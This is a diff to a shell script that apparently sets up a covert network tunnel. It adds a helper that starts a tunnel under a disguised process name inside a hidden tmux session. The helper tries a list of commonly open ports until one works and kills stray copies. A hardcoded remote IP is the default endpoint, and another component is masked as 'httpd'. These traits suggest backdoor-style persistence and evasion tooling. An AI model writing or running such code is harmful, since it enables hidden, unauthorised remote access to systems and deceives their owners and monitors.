@@ -60,23 +60,70 @@ if [ $(tmx ls | wc -l) = 0 ]; then
 fi
 
 ## glibc not needed on standalone
+
 ## tnl
-cat <<TSTARTER > tstarter
-checks() {
-         pid="$(pgrep -xf "php -C php.ini")"
+## $1 is the starting port (for overrides)
+function gen_tstarter(){
+    cat <<TSTARTER > tstarter
+source shared.env
+portavl() {
+          if \$(busybox nc -z 127.0.0.1 \${TNL_LISTEN}); then
+             return 1
+          else
+             return 0
+          fi
+}
+checktnl() {
+         local pid="\$(pgrep -xf "${TNL_MASK} ${TNL_ARGS}")"
          ## lsof or netstat require /proc so not reliable
-         port="$(nc)
+         local port="\$(busybox nc -z 127.0.0.1 \${TNL_LISTEN} && echo 1)"
+         local tss="\$(tmx ls | grep ${TNL_MASK})"
+         if [ -z "\$pid" -o -z "\$port" -o -z "\$tss" ]; then ## order kind of matters
+            return 1
+         else
+            return 0
+         fi
 }
-start(){
-    ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS} &
+starttnl(){
+    ## starttnl should never be called more than once at a time
+    if [ -n "\$(pgrep -xf "${TNL_MASK} ${TNL_ARGS}")" ]; then
+       if [ -n "\$(tmx ls | grep "$TNL_MASK")" ]; then
+          echo \${TNL_LISTEN}
+          exit ## tnl started and already in session
+       else ## a rogue tunnel not within its session kill it
+          pkill -xf "${TNL_MASK} ${TNL_ARGS}"
+       fi
+    fi
+    tmx kill-session -t ${TNL_MASK} &>/dev/null
+    tmx new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}
+    sleep 1 ## time to bind
 }
-for p in "$TNL_PLIST"; do
-    start
-    while [ ]; do
-    done
+
+export TNL_LISTEN=\$1
+for port in $TNL_PLIST; do
+    if portavl; then
+        starttnl
+    else
+        checktnl && exit 0 ## check again in case of late start
+        export TNL_LISTEN=\$port
+        envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
+        continue
+    fi
+    if checktnl; then
+        echo \${TNL_LISTEN}
+        exit
+    else
+        export TNL_LISTEN=\$port
+        envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
+    fi
 done
 
+exit 1
+
 TSTARTER
+    return $?
+}
+
 function setup_tnl(){
     TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
     TNL_PLIST="80 443 20 21 465 993 995 110 123 2703 3036 8080 8081 8082 9000 10000"
@@ -105,8 +152,8 @@ function setup_tnl(){
            TNL_PROTO \
            TNL_TARGET
     envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
-    tmx kill-session -s ${TNL_MASK} &>/dev/null
-    tmx new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}
+    gen_tstarter && TNL_LISTEN=$(bash -i tstarter ${TNL_LISTEN})
+    export TNL_LISTEN ## tstarter should echo the working port
 }; setup_tnl
 
 OBJ_MASK=${OBJ_MASK:-httpd}
